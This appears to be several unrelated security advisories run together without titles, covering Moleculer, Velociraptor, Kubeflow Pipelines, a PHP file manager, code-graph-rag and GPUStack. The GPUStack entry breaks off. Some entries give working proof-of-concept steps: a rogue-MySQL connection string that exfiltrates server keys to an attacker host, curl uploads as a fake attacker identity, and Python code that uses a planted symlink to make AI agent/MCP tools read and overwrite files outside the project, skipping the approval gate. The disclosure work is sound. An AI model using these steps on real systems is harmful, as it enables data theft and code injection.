### Summary

The TCP transporter's packet parser (`src/transporters/tcp/parser.js`) reads the packet length field with `Buffer.prototype.readInt32BE`, a signed read. A crafted packet whose length field has the sign bit set yields a negative `length`. The parser then advances past the parsed message with `packet = packet.slice(length)`, but `Buffer.prototype.slice` clamps an out-of-range negative start index to `0`, so the buffer is returned unchanged. The `while (packet.length > 0)` loop condition therefore never becomes false, producing an infinite synchronous loop that blocks the Node.js event loop indefinitely.

### Impact

Any Moleculer node using the TCP transporter can be rendered completely unresponsive by an unauthenticated remote peer sending a single ~10-byte crafted TCP packet, before any protocol handshake or authentication takes place. `TcpReader.onTcpClientConnected` pipes each accepted socket's bytes straight into a fresh `Parser` instance (`socket.pipe(parser)`) with no handshake, so the code path is reachable by any peer able to reach the transporter's listening port. Because Node.js is single-threaded, the hang blocks the entire event loop of the process, taking down every service hosted in it until it is forcibly restarted. TCP transporter endpoints are frequently auto-discovered via UDP broadcast, so any host on the same network segment can reach the port.

Neither the CRC check nor `maxPacketSize` mitigate the issue: the CRC bytes are fully attacker-computable, and `maxPacketSize` bounds the received buffer size, not the value of the length field.

### Affected component

`Parser._write` in `src/transporters/tcp/parser.js`.

### Patch

The fix validates that the decoded length is at least the 6-byte header size before processing, rejecting negative and undersized values (which would otherwise fail to shrink the buffer) with an error on the write callback instead of looping.

### Credit

Reported by xor4xor via the Tidelift security program.

## Summary

The `sql()` VQL plugin runs a caller-supplied database driver and connection string with no permission check (`vql/parsers/sql/sql.go:93`, `SQLPlugin.Call`). For `driver='mysql'` or `driver='postgres'` the handle comes from `GetHandleOther` (`sql.go:39`), which passes the connection string straight to Go `database/sql` `sql.Open` (`sql.go:51`) and executes the query (`sql.go:159`).

The plugin declares `FILESYSTEM_READ` only as `Info().Permissions` metadata (`sql.go:219`). That metadata is never consulted at runtime: `metadata.go:19` stores it as a string that only the documentation exporter reads (`api/reflect.go:82-110`). Every sibling network plugin (`http_client`, `netcat`, `s3`, `rsyslog`) calls `CheckAccess(acls.NETWORK)` in its own body; `sql()` calls nothing.

The built-in `analyst` role holds `ANY_QUERY` but not `FILESYSTEM_READ` or `NETWORK` (`acls/roles.go:222`), and reaches this sink through the notebook query API.

Result: a low-priv analyst opens arbitrary outbound TCP connections and, through a rogue MySQL server's `LOAD DATA LOCAL INFILE`, reads any file the root-running server can read, including the deployment CA private key.

## Affected

- Velocidex/velociraptor server, `<= v0.77.1` (latest release, 2026-06-23). Identical vulnerable code in `master` HEAD `1961e79` (2026-07-17).
- Confirmed live-exploitable on the official `ghcr.io/velocidex/velociraptor-server:latest` image (build 0.77.1, commit bbe2a58).
- Stock install, default Basic authenticator, any built-in `analyst`, `investigator`, or `api` role (all hold `ANY_QUERY`, none holds `FILESYSTEM_READ` or `NETWORK`).
- No non-default flag required.

## Root cause

`SQLPlugin.Call` (`vql/parsers/sql/sql.go:93`) parses the caller `driver`, `connstring`, and `query` arguments and reaches `handle.Query` (`sql.go:159`) without any `vql_subsystem.CheckAccess` call in its body. For `driver='mysql'` or `driver='postgres'` the handle comes from `GetHandleOther` (`sql.go:39`), which hands the attacker connection string to `sql.Open` (`sql.go:51`), so the plugin dials an arbitrary host and, through the MySQL client `LOAD DATA LOCAL INFILE` feature, reads local files. The plugin states its intended gate only as metadata, `VQLMetadata().Permissions(acls.FILESYSTEM_READ)` (`sql.go:219`), but `MetadataBuilder.Permissions` merely stores a string (`vql/metadata.go:19`) that is read only by the reflection exporter (`api/reflect.go:82-110`), never by the query engine. Every sibling network plugin enforces `CheckAccess(acls.NETWORK)` in its own body, so the omission in `sql()` is an enforcement oversight. The default `analyst` role grants `ANY_QUERY` without `FILESYSTEM_READ` or `NETWORK` (`acls/roles.go:222`), so a user the operator deliberately restricted still reaches the ungated sink.

Note on intent: `acls/acls.go` documents that specific permission combinations grant admin-equivalent power (`SERVER_ARTIFACT_WRITER` with `COLLECT_SERVER`, `ARTIFACT_WRITER` with `COLLECT_CLIENT`), but the `analyst` role holds none of them and is denied `EXECVE`, `NETWORK`, and `FILESYSTEM_READ` on every sibling plugin. If `ANY_QUERY` is nonetheless intended as trusted, the plugin's own `Permissions(FILESYSTEM_READ)` metadata and the runtime enforcement on all sibling plugins are misleading and should be reconciled; otherwise this is a missing runtime check.

## Reproduction

`ghcr.io/velocidex/velociraptor-server:latest` (v0.77.1), default config, GUI on `https://localhost:8889`, one built-in `analyst` user.

1) As `analyst`, confirm the control: the gated accessor denies the read.

    sql(driver='sqlite', accessor='file', file='/etc/passwd', query='SELECT 1')
    => sql: Field file Accessor file: PermissionDenied: Permission denied: [FILESYSTEM_READ]

2) Start a rogue MySQL server on an attacker host that completes the handshake and answers any query with a `LOAD DATA LOCAL INFILE <target>` packet.

3) As the same `analyst`, call the ungated branch through the notebook query API:

    POST /api/v1/UpdateNotebookCell   (Basic auth + x-csrf-token)
    {"type":"vql","input":"SELECT * FROM sql(driver='mysql',
      connstring='x:y@tcp(<ATTACKER>:4499)/z?allowAllFiles=true', query='SELECT 1')"}

The rogue server receives the file:

    QUERY: 'SELECT 1'
    EXFIL 12860 bytes  /etc/velociraptor/server.config.yaml
      contains: CA private_key, gw_private_key, Frontend private_key

Live-verified: analyst `pocdemo` exfiltrated `/etc/passwd`, `/etc/shadow` (mode 0600), and `server.config.yaml`, each sha256 byte-identical to `docker exec sha256sum`, while `http_client()` on the same account returns `PermissionDenied: [NETWORK]`.

## Impact

* CA and Frontend RSA private keys disclosed: forge client certificates, impersonate the server to every enrolled endpoint.
* Any root-readable file on the server host disclosed (`/etc/shadow`, datastore user records with password hashes, cross-tenant `orgs` data).
* Arbitrary outbound TCP from the server host through the same sink and the `upload_sftp`, `upload_smb`, `upload_azure`, `upload_gcs` plugins.
* Root-owned file creation at any path via the `sqlite` branch (zero-permission `data` accessor plus an in-query `ATTACH DATABASE`).
* Triggered by the lowest built-in query role, default config, one query, no admin interaction.

## Summary

In multi-user mode, the Kubeflow Pipelines API server's HTTP multipart upload endpoints (`POST /apis/v2beta1/pipelines/upload` and `POST /apis/v2beta1/pipelines/upload_version`) perform no authorization when the target namespace is empty. The authorization helper `canUploadVersionedPipeline` returns `nil`, skipping `SubjectAccessReview`, whenever the resolved namespace is the empty string (`backend/src/apiserver/server/pipeline_upload_server.go:401-403`). An empty namespace is how KFP addresses shared, cluster-wide pipelines and is the default whenever the caller omits the `namespace` query parameter, because `REQUIRE_NAMESPACE_FOR_PIPELINES` defaults to `false` and is unset in every shipped manifest. As a result, an arbitrary low-privilege tenant (or, when the API server is reachable, an unauthenticated caller) can create cluster-shared pipelines and inject new versions into existing shared pipelines, replacing the container image, command, and args that other tenants execute. The gRPC sibling for the same write, `canAccessPipeline`, instead remaps the empty namespace to the system namespace and authorizes, with a comment stating shared-pipeline writes "must still be authorized". That confirms this is an omission, not intended behavior.

## Description

`uploadPipeline` and `uploadPipelineVersion` both build a `ResourceAttributes{Verb: create}` and delegate the access decision to `canUploadVersionedPipeline`:

```go
// backend/src/apiserver/server/pipeline_upload_server.go:387-421
func (s *PipelineUploadServer) canUploadVersionedPipeline(r *http.Request, pipelineID string, resourceAttributes *authorizationv1.ResourceAttributes) error {
	if !common.IsMultiUserMode() {
		return nil
	}
	if len(pipelineID) > 0 {
		namespace, err := s.resourceManager.FetchNamespaceFromPipelineId(pipelineID)
		if err != nil {
			return util.Wrap(err, "Failed to authorize with the Pipeline ID")
		}
		if len(resourceAttributes.Namespace) == 0 {
			resourceAttributes.Namespace = namespace
		}
	}
	if resourceAttributes.Namespace == "" {
		return nil          // empty namespace = no SubjectAccessReview
	}
	// ... only here does IsAuthorized() run ...
}
```

When the namespace is empty (a shared/cluster-wide pipeline, or simply an upload with no `namespace` parameter), the function returns at line 401-403 and `IsAuthorized` is never reached.

Reachability is the default. `ValidateNamespaceRequired` only rejects an empty namespace when `IsNamespaceRequiredForPipelines()` is true:

```go
// backend/src/apiserver/validation/namespace.go:25-30
func ValidateNamespaceRequired(namespace string) error {
	if common.IsMultiUserMode() && common.IsNamespaceRequiredForPipelines() && namespace == "" {
		return util.NewInvalidInputError("Namespace is required for pipeline operations")
	}
	return nil
}
// backend/src/apiserver/common/config.go:73-74  -> default FALSE
func IsNamespaceRequiredForPipelines() bool {
	return GetBoolConfigWithDefault(RequireNamespaceForPipelines, false)
}
```

`REQUIRE_NAMESPACE_FOR_PIPELINES` (`config.go:41`) defaults to `false` and is not set in any manifest under `manifests/`. So in a default multi-user install, empty namespaces pass validation and flow into the unguarded branch.

The gRPC sibling proves the intended behavior is to authorize empty-namespace writes:

```go
// backend/src/apiserver/server/pipeline_server.go:1290-1306 (canAccessPipeline)
	// Skip authorization for read-only operations on shared pipelines in multi-user mode.
	// Write operations (create, update, delete) on shared pipelines must still be authorized
	// against the KFP system namespace, since shared pipelines have no namespace of their own.
	if s.resourceManager.IsEmptyNamespace(resourceAttributes.Namespace) {
		if resourceAttributes.Verb == common.RbacResourceVerbGet || resourceAttributes.Verb == common.RbacResourceVerbList {
			return nil
		}
		resourceAttributes.Namespace = common.GetPodNamespace()
		// ... IsAuthorized(...) ...
		return nil
	}
```

Reads of shared pipelines intentionally skip authorization; writes must be authorized against the system namespace. The upload endpoints only ever perform writes, yet `canUploadVersionedPipeline` applies the read behavior to them.

## Proof of Concept

Reproduced live against the real API server binary (`ghcr.io/kubeflow/kfp-api-server@sha256:621fdae9bfcc93405eca299c24f715bc7f17dbb76f1b53e8b2b35852e4d7d423`, `MULTIUSER=true`, `REQUIRE_NAMESPACE_FOR_PIPELINES` unset). The API server SA holds `subjectaccessreviews/tokenreviews: [create]` (authz fully functional); identity `attacker@evil.com` has no RBAC anywhere; `victim-ns` exists with no grant to the attacker.

1. Shared (empty-namespace) pipeline create as the unprivileged attacker (HTTP 200):
   ```
   curl -F uploadfile=@pipeline.yaml -H "kubeflow-userid: attacker@evil.com" \
     "http://APISERVER:8888/apis/v2beta1/pipelines/upload?name=shared-pwn"
   -> {"pipeline_id":"80cd99df-...","name":"shared-pwn", ...}
   ```
2. Inject a new version into that shared pipeline, the high-impact primitive (HTTP 200):
   ```
   curl -F uploadfile=@pipeline2.yaml -H "kubeflow-userid: attacker@evil.com" \
     "http://APISERVER:8888/apis/v2beta1/pipelines/upload_version?name=evilversion&pipelineid=80cd99df-..."
   -> {"pipeline_version_id":"32299f65-...","name":"evilversion","pipeline_spec":{ attacker IR }}
   ```
3. Same create with no identity header at all: HTTP 200 (`anon-shared-pwn` created).
4. Negative control, same attacker, `&namespace=victim-ns` (real namespace, no RBAC): HTTP 400, rejected at `pipeline_upload_server.go:135` (the `canUploadVersionedPipeline` error path). Authorization is live; only the empty-namespace branch bypasses it.
5. Asymmetry, gRPC `POST /apis/v2beta1/pipelines` with empty namespace as the same attacker: HTTP 403 PermissionDenied (`ResourceAttributes{Namespace:kubeflow,Verb:create,...}`). The gRPC path remapped empty to the system namespace and authorized.

API server logs corroborate: every empty-namespace upload logs `Upload pipeline called` with no following `Authorizing request`, while every namespaced upload and every gRPC create logs `Authorizing request` then `PermissionDenied`. Database state persists the attacker's `shared-pwn` and `anon-shared-pwn` pipelines and the injected `evilversion`; the denied `ns-pwn` created nothing.

Full scaffolding (`run.sh`, `01-mysql.yaml` through `05-apiserver.yaml`, `pipeline.yaml`, `pipeline2.yaml`) and captured evidence are available on request.

## Impact

In multi-user deployments that permit shared pipelines, a low-privilege tenant can create shared pipelines or add attacker-controlled versions to existing shared pipelines without the required write permission. Direct access to the API server without an authenticating proxy can also expose the bypass to unauthenticated callers; the CVSS vector below assesses the authenticated tenant scenario.

An attacker can upload a malicious version of an existing shared pipeline consumed by a recurring run configured to follow the latest version. On its next scheduled execution, the controller resolves the newly uploaded version and executes it in the consuming run's namespace using its configured service account, without further user interaction. Recurring runs pinned to a specific version or containing an embedded specification are not subject to this automatic substitution.

This automatic path requires an enabled, unpinned recurring run consuming the targeted shared pipeline and an uploaded specification compatible with the run's inputs. Latest-version selection queries the newest ready pipeline version; it does not depend on the `UpdatePipelineVersionByDefault` setting.

The automatic execution path was verified by source inspection, including the `2.17.2` tag: recurring-run creation preserves an unpinned pipeline reference, the scheduled-workflow controller submits it to `CreateRun`, and the API resolves the latest version before constructing the workflow. This is distinct from the live upload-bypass reproduction above; an end-to-end scheduled victim-execution reproduction has not been performed as part of this maintainer assessment.

Execution occurs with the victim workload's permissions and access to its mounted data and credentials. It can compromise confidential data and execution integrity available to that workload. It does not inherently grant access to every secret in the victim namespace or cluster-admin privileges.

### CVSS rationale

The retained CVSS v3.1 vector is **9.6 Critical — `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N`**.

- **AV:N / AC:L / PR:L:** an authenticated low-privilege tenant can submit a normal multipart version upload targeting a shared pipeline, without shared-pipeline write permission.
- **UI:N:** an existing unpinned recurring run can consume the injected version automatically; no further victim action is required.
- **S:C:** the scored consequence extends from unauthorized modification of the shared pipeline catalog to code execution under a separate victim workload's Kubernetes namespace and service-account authority, not merely modification of another catalog entry.
- **C:H / I:H:** attacker-controlled workload code can compromise the confidentiality and integrity of resources available under that victim execution authority. These impacts do not imply cluster-wide access.
- **A:N:** this vector does not claim an independently established availability impact.

## Patches / Remediation

The fix merged into `master` on September 9, 2026 in [kubeflow/pipelines#14352](https://github.com/kubeflow/pipelines/pull/14352), commit [62516d8c525f146b754cb515cf441dd0290ad841](https://github.com/kubeflow/pipelines/commit/62516d8c525f146b754cb515cf441dd0290ad841).

The upload authorization helper now uses `ResourceManager.IsEmptyNamespace` to recognize both the empty string and the legacy `model.NoNamespace` (`"-"`) representation of shared pipelines. It checks shared writes against the configured KFP system namespace through `IsAuthorized`, requiring `create` on the `pipelines` resource in the `pipelines.kubeflow.org` API group. This matches the gRPC shared-write policy without changing the stored pipeline namespace. Namespaced authorization, single-user behavior, and intentional latest-version scheduling remain unchanged.

The original fix by Vito Carolillo (@vcrll) was carried forward with its authorship and DCO sign-off preserved. Separate maintainer commits added regression coverage, sentinel handling, and test-harness compatibility corrections.

### Validation

- 32 endpoint regression cases cover both v1beta1 and v2beta1 pipeline and pipeline-version uploads: allowed and denied shared writes (empty and sentinel namespaces), namespaced writes, and single-user behavior. Tests verify exact SubjectAccessReview attributes and preservation of stored namespaces.
- A negative control restoring the original early return caused the new shared-upload tests to fail, including denied requests returning HTTP 200 without an authorization check.
- The full server unit-test package and changed-package lint passed during remediation.
- E2E test clients were corrected to send their generated authentication token and target the tenant namespace for HTTP uploads. Kubernetes-native clients retain their constructor-configured namespace rather than receiving an unsupported upload parameter. Helper regression tests and E2E/API package compilation passed.

### Release status and upgrade guidance

The first fixed release is **[2.18.0](https://github.com/kubeflow/pipelines/releases/tag/2.18.0)**. Releases through **2.17.3** remain affected; the affected-version upper bound is `<= 2.17.3` and the patched version is `2.18.0`.

The 2.18 [RBAC and client migration guide](https://github.com/kubeflow/pipelines/blob/2.18.0/docs/operator-guides/rbac-migration-2.18.md) is included through [PR #14655](https://github.com/kubeflow/pipelines/pull/14655). Related trusted-scheduling changes do not replace upload authorization or remove previously uploaded versions. Roll out the matching server/manifests and review existing shared versions and schedules.

In multi-user deployments, callers that previously relied on unauthenticated or unauthorized shared uploads will now be rejected:

- **UI:** choose **Private** (the default in the upload dialog) for tenant-owned pipelines. **Shared** uploads require an authorized shared-pipeline writer.
- **Python SDK:** explicitly pass the tenant namespace, for example `client.upload_pipeline("pipeline.yaml", namespace="my-namespace")`. Setting `Client(namespace=...)` alone does not populate this upload argument.
- **New versions:** inherit the existing pipeline's namespace. Existing shared pipelines must be maintained by an identity with the required system-namespace pipeline permission, or re-uploaded as new namespaced pipelines with consuming runs and schedules repointed.
- **Kubernetes-native uploads:** retain their existing client-configured namespace contract.

Do not grant blanket system-namespace access or restore the authorization bypass to preserve old upload scripts. Grant only the required pipeline-write permission to designated shared-pipeline maintainers.

As an interim hardening measure before deploying the fix, operators can set `REQUIRE_NAMESPACE_FOR_PIPELINES=true` to reject empty-namespace pipeline operations, with the corresponding compatibility impact on shared uploads.

Restoring upload authorization does not remove previously uploaded malicious versions or migrate existing pipelines and runs. Operators should review shared-pipeline versions and consuming recurring runs for unauthorized changes; pinning to a reviewed version prevents subsequent latest-version substitution.

The visualization authorization issue is tracked separately in [GHSA-w9j6-6675-75m4](https://github.com/kubeflow/pipelines/security/advisories/GHSA-w9j6-6675-75m4) and is outside this fix's scope.

## Summary

`POST /upload` uses the request-supplied `resumableFilename` directly as a key into the shared temporary directory, without the character filter it applies to `resumableIdentifier` and without namespacing it per user. A valid user holding the `upload` permission can read any file in that directory into their own home directory, append to it, and delete it.

This reproduces the cross-user batch-archive disclosure of GHSA-f74m-x83r-c4v4 through a different route — it still works with the fix for that advisory (PR #597) applied — and additionally allows deleting the login rate-limit lockfile.

Reported with explicit preconditions and bounded impact, as before: the primitive is confined to the temporary directory, not the whole filesystem.

## Details

- `backend/Controllers/UploadController.php:61` — `$file_name = $request->input('resumableFilename', 'file')` is **not** passed through the `preg_replace('/[^0-9a-zA-Z_]/', '', ...)` that line 66 applies to `resumableIdentifier`.
- Line 88 builds `$prefix` namespaced by the sanitized username, but `$file_name` reaches the temporary storage at lines 118, 121 and 125 **without** that prefix.
- Line 115 — `if ($chunks_size >= $total_size)` is entered whenever `resumableTotalSize` is `0`.
- Lines 116-119 — the assembly loop `for ($i = 1; $i <= $total_chunks; ++$i)` does not execute when `resumableTotalChunks` is `0`, so nothing is written to `$file_name`.
- Line 121 — `readStream($file_name)` therefore reads the pre-existing temporary file of that exact name.
- Line 122 — its contents are stored into the requester's own home directory.
- Line 125 — `remove($file_name)` deletes it.

Path traversal outside the temporary directory is prevented by `Tmpfs::sanitizeFilename()`, so the primitive is bounded to that directory — but every user's transient objects share it.

## PoC

Preconditions: a multi-user deployment with distinct per-user `homedir`s. The attacker is a valid low-privileged user holding `upload` (a first-class permission in the admin UI, and present in the shipped `users.json.blank` admin set).

1. Victim creates a batch archive via `POST /batchdownload`; the JSON response returns the archive id.
2. Attacker sends **one** `POST /upload` with `resumableFilename=<victim's id>`, `resumableTotalChunks=0`, `resumableTotalSize=0`, `resumableRelativePath=/`, and any small valid file part.
3. Response is `{"data":"Stored"}`. The victim's archive is now byte-identical in the attacker's home directory, retrievable through the ordinary `GET /download`. The victim's temporary archive has been deleted.

Verified end to end with a PHPUnit test against current `master`; the archive contents matched byte for byte. Test file available on request.

## Impact

Missing authorization (CWE-862) on temporary storage objects.

- **Cross-user disclosure** of any transient object whose name the attacker can learn or predict. This includes batch archives — so GHSA-f74m-x83r-c4v4's impact remains reachable even with its fix applied — and the plaintext per-file copies that `ZipArchiver::addFileFromStorage()` writes while an archive is being built (those still use `uniqid()`, which is timestamp-derived).
- **Arbitrary delete** within the temporary directory. `AuthController::login()` stores the login rate-limit counter as `md5($ip).'.lock'` in that same directory (`backend/Controllers/AuthController.php:36`, checked at line 44, written at line 58). An attacker can compute their own lockfile name and delete it, defeating the lockout.
- **Arbitrary append**: with `resumableTotalChunks >= 1`, line 118 `write($file_name, ..., true)` appends attacker-controlled bytes to an arbitrary existing temporary file.

## Remediation

Do not use the request-supplied filename as a storage key. Namespace the assembly file per user — for example reuse the existing `$prefix` — and carry the display filename separately for the `storage->store()` call.

Note that simply applying the `[^0-9a-zA-Z_]` filter to `resumableFilename` would corrupt legitimate uploads (`sample.txt` becomes `sampletxt`), because `$final['filename']` is what becomes the stored name. The fix needs the namespacing, not just the filter.

### Summary
`GET /batchdownload` streams a batch ZIP to any requester who supplies its `uniqid`, without checking that the current user/session created it. In deployments where users have separate home directories, a valid low-privileged user who obtains an active archive id can download another user's batch archive, disclosing files the per-user boundary otherwise protects. Reported with explicit preconditions and bounded impact — not a universal "any user steals any file" issue.

### Details
The archive id is generated with plain `uniqid()` and no ownership metadata is bound to it before streaming.

- `backend/Services/Archiver/Adapters/ZipArchiver.php:44` — `createArchive()` uses plain `uniqid()`.
- `backend/Controllers/DownloadController.php:144-145` — `batchDownloadStart()` reads the tmpfs file by the request-supplied `uniqid` after only a charset `preg_replace()`.
- `backend/Controllers/DownloadController.php:158` — the tmpfs archive is removed only after streaming.
- `backend/Controllers/routes.php:207-226` — both batch endpoints are exposed to normal roles with `read`, `download`, `batchdownload`.

No user id, session id, home directory, or creator check is applied before streaming. The code path is unchanged since commit `3f03a40` (2022-05-31) and is present in the latest release `v7.14.3`.

### PoC
Preconditions: a multi-user deployment with distinct per-user `homedir`s (set per-user in `users.json`, or `private_repos => true` on the WordPress/LDAP adapter). The shipped sample config (`admin`/`guest` both at `/`, `guest` with no perms) does not create this boundary on its own. Attacker is a valid user with `read`, `download`, `batchdownload`.

1. User John (`homedir /john`) creates `secret.txt`, signs in, and creates a batch archive via `POST /batchdownload`. The JSON response returns the archive `uniqid`.
2. User Jane (`homedir /jane`, with `batchdownload`) signs in normally.
3. Jane's direct `GET /download` of `/secret.txt` returns `302` — the normal home-directory boundary blocks the file.
4. Jane sends `GET /batchdownload?uniqid=<John's id>` and receives a valid ZIP containing `secret.txt` with John's content.

A PHPUnit proof with two real sessions reproduces this end to end (`OK, 3 tests / 29 assertions`), plus a lifecycle test (`OK, 2 tests / 9 assertions`). Full test files, run logs, and a real Apache access-log replay demo are available on request.

Lifetime / acquisition: a normal completed download removes the archive at the end of streaming, limiting the window. An aborted/failed download leaves the archive in tmpfs (cleanup never reached). The frontend issues the download as a top-level navigation (`window.open('.../batchdownload&uniqid='+ret.uniqid, '_blank')`), so the id appears in standard web access logs. That access-log path only adds meaningful impact when log visibility is decoupled from host filesystem access (e.g. a log-aggregation/shared-hosting/downstream-sink reader) and the archive is still alive; if the reader is ops/root on the same host they can already read the storage tree directly. The `uniqid()` token is timestamp-derived (1,000,000-value space per known second) — included to justify a CSPRNG, not presented as a practical universal brute force.

### Impact
Missing authorization (CWE-862) on a temporary download object, leading to cross-user file disclosure across the per-user home-directory boundary in configured multi-user deployments. Secondary effect: a successful replay deletes the victim's pending archive (the GET removes the tmpfs file after streaming), denying the victim their own download if not yet consumed.

Remediation: generate ids with `bin2hex(random_bytes(32))`; store creator user/session + home dir + expiry per archive id; verify the requester matches before streaming and return `403`/`404` on mismatch or unknown/expired id; delete metadata with the tmpfs file.

A remote/local attacker who can get a symbolic link included in a source-code repository that code-graph-rag analyzes can cause the `structural_search` and `structural_replace` tools (backed by `AstGrepService`, exposed both as MCP tools and as agentic AI tools) to read and -- via `structural_replace` with `dry_run=False` -- overwrite arbitrary files outside the configured project root, because the tool's path-containment check (`should_skip_path`/`_classify_file`) is performed lexically on the unresolved path and never checks `Path.is_symlink()` or calls `.resolve()`, unlike the project's own (correct) `validate_project_path` decorator used elsewhere.

Tested at commit `90a3ed3cbdc7d3bb8036985b851cc7c9a3ba9c57` (pyproject version 0.0.550), current `main` at test time. Confirmed this commit already contains the fix for the prior advisory (GHSA-vvr2-h2jp-838m: paginated `read_file` path traversal) and the newer HTTP-MCP bearer-auth gate (`_validate_http_exposure` in `codebase_rag/mcp/server.py`) -- this is a distinct, still-open issue on top of those fixes, in a different component with a different root cause and a strictly worse impact (write, not just read).

## Details

`AstGrepService` (`codebase_rag/tools/ast_grep_service.py`) backs both the `structural_search` and `structural_replace` MCP/agentic tools. It enumerates candidate files with `os.walk()` and gates each path only through `should_skip_path()`:

- `codebase_rag/tools/ast_grep_service.py:84-109` (`_iter_source_files`) -- walks `self.project_root` with `os.walk()`; every non-directory dirent returned (including a symlink pointing anywhere on disk) is treated as an in-scope file.
- `codebase_rag/tools/ast_grep_service.py:61-82` (`_classify_file`) -- the only containment check is `should_skip_path(...)` followed by `abs_path.relative_to(self.project_root)` (line 82); `abs_path` is never resolved, so this check is purely lexical/string-based.
- `codebase_rag/utils/path_utils.py:80-109` (`should_skip_path`) and `codebase_rag/utils/path_utils.py:35-37` (`cached_relative_path`) -- computes `rel_path = file_path.relative_to(repo_path)` without ever calling `.resolve()` or `Path.is_symlink()`.
- Read sink: `codebase_rag/tools/ast_grep_service.py:143-144` (`search`) -- `source = self._read(abs_path)` calls `path.read_text()`, which Python follows through the symlink to its real target.
- Write sink: `codebase_rag/tools/ast_grep_service.py:187-208` (`replace`), line 208 -- `abs_path.write_text(new_source, ...)` when `dry_run=False`, again following the symlink and overwriting the real target file's content.

This is inconsistent with how the rest of the codebase handles the exact same class of risk. The file read/write/edit tools (`file_reader.py`, `file_writer.py`, `file_editor.py`) are all protected by `validate_project_path` (`codebase_rag/decorators.py:73-75`):

```python
full_path = (self.project_root / file_path_str).resolve()
project_root = self.project_root.resolve()
full_path.relative_to(project_root)
```

`.resolve()` follows symlinks before the containment check runs, so those tools correctly reject an out-of-root target. `path_utils.py`'s own `absolute_path_within_project_root()` (`codebase_rag/utils/path_utils.py:156-176`) documents the same principle explicitly in its docstring: "The resolve() calls are load-bearing: containment is checked lexically, so an unresolved .. segment or symlink would escape the root." -- but `should_skip_path()`/`AstGrepService` never applies that pattern.

**Reachability:** `structural_search` (`codebase_rag/tools/structural_search.py:24-46`) carries no `requires_approval` flag at all -- in AI-orchestrator mode the model can call it autonomously with no human confirmation. `structural_replace` (`codebase_rag/tools/structural_editor.py:52-57`) is marked `requires_approval=True`, but that flag is only enforced by pydantic-ai's own agent loop -- the MCP server path bypasses it entirely: `MCPToolsRegistry.structural_replace` (`codebase_rag/mcp/tools.py:586-596`) calls `self._structural_editor_tool.function(...)` directly, registered with no approval concept at `codebase_rag/mcp/tools.py:369-388`. Any MCP client that can call tools can invoke `structural_replace` with `dry_run=False` in one shot.

## Proof of Concept

Dynamically confirmed against the installed package (mgclient/pymgclient mocked, as in the prior advisory's own PoC, since the Memgraph native client isn't needed for this code path).

```bash
mkdir -p /tmp/poc_symlink/safe-project-root
cat > /tmp/poc_symlink/outside-secret.py << 'EOF'
API_TOKEN = "sk-live-EXAMPLE-NOT-A-REAL-SECRET-1234567890"
def get_token():
    return API_TOKEN
EOF
ln -s /tmp/poc_symlink/outside-secret.py /tmp/poc_symlink/safe-project-root/linked_module.py
```

```python
import sys
from pathlib import Path
from unittest.mock import MagicMock
sys.modules["mgclient"] = MagicMock()
sys.modules["pymgclient"] = MagicMock()
from codebase_rag.tools.ast_grep_service import AstGrepService

SAFE_ROOT = "/tmp/poc_symlink/safe-project-root"
svc = AstGrepService(project_root=SAFE_ROOT)

matches = svc.search(pattern="API_TOKEN", language="python")
# -> match in reported file='linked_module.py' text='API_TOKEN'  (read escape)

changes = svc.replace(pattern="API_TOKEN", rewrite="PWNED_BY_STRUCTURAL_REPLACE",
                       language="python", dry_run=False)
print(Path("/tmp/poc_symlink/outside-secret.py").read_text())
```

Actual run output:

```
[*] Calling AstGrepService.search('API_TOKEN', language='python') ...
    match in reported file='linked_module.py' text='API_TOKEN'
    match in reported file='linked_module.py' text='API_TOKEN'
[+] READ ESCAPE CONFIRMED: content of the out-of-root file was returned by
    structural_search(), attributed to a path 'inside' the project root.

[*] Calling AstGrepService.replace(pattern='API_TOKEN',
    rewrite='PWNED_BY_STRUCTURAL_REPLACE', dry_run=False) ...
    wrote change to reported file='linked_module.py' matches=2

[*] Outside file content AFTER structural_replace:
---------------------------------------------------------
# Simulated sensitive file OUTSIDE the analyzed project root
PWNED_BY_STRUCTURAL_REPLACE = "sk-live-EXAMPLE-NOT-A-REAL-SECRET-1234567890"

def get_token():
    return PWNED_BY_STRUCTURAL_REPLACE
---------------------------------------------------------
[+] WRITE ESCAPE CONFIRMED: a file OUTSIDE the configured project_root
    (/tmp/poc_symlink/safe-project-root) was modified by structural_replace
    via a symlink placed inside the root.
```

## Impact

Any operator who points `cgr` (CLI, agentic `ask_agent` mode, or MCP `structural_search`/`structural_replace` tools) at a repository they did not fully audit -- the exact use case this tool is built for ("query, understand, and edit multi-language codebases") -- can have that repository's planted symlink used to:
- Disclose the contents of any file readable by the `cgr` process (credentials, SSH keys, `.env` files, sibling project source), via `structural_search`, with no approval gate at all.
- Overwrite the contents of any file writable by the `cgr` process, via `structural_replace(dry_run=False)`, bypassing the tool's own approval gate when called through the MCP protocol.

## Remediation

Apply the same resolve-then-contain pattern already used by `validate_project_path` (`codebase_rag/decorators.py:73-75`) and `absolute_path_within_project_root` (`codebase_rag/utils/path_utils.py:156-176`) to `should_skip_path`. Reject any path whose resolved (symlink-followed) location escapes the resolved project root:

```diff
a/codebase_rag/utils/path_utils.py
+++ b/codebase_rag/utils/path_utils.py
@@ def should_skip_path(
     _is_file = path.is_file() if is_file is None else is_file
     if _is_file and path.suffix in cs.IGNORE_SUFFIXES:
         return True
+    # Reject symlinks (or any path) that resolve outside the project root,
+    # mirroring validate_project_path's decorator (decorators.py:73-75) and
+    # absolute_path_within_project_root (this module, below).
+    try:
+        path.resolve().relative_to(repo_path.resolve())
+    except ValueError:
+        return True
     rel_path = cached_relative_path(path, repo_path)
```

Concretely: this one change in `should_skip_path` fixes both `_classify_file` (search) and the `os.walk` filtering in `_iter_source_files` (replace), since both route through it. As defense in depth, `_iter_source_files` could additionally skip symlinked dirents outright (`entry.is_symlink()`) during the `os.walk`.

### Impact

In GPUStack before v2.2.0, `get_current_user` (in `gpustack/api/auth.py`) promotes any request whose source is considered loopback to the built-in administrator account when `force_auth_localhost` is `False` (the default). The "source" is derived by `client_ip_getter`, which can be made to report `127.0.0.1` without any credentials in two ways:

1. **Same-host reverse proxy (TCP peer).** In the canonical self-hosted shape —
   GPUStack behind a same-host reverse proxy with `proxy_pass
   http://127.0.0.1:<port>` — every remote request arrives at GPUStack with TCP
   peer `127.0.0.1`, so the loopback auto-admin branch fires. No header or
   credential is required. Verified end-to-end against HEAD `6bee5883`.
2. **`X-GPUStack-Real-IP` header.** A forged `X-GPUStack-Real-IP: 127.0.0.1`
   header can cause the request source to be treated as loopback.

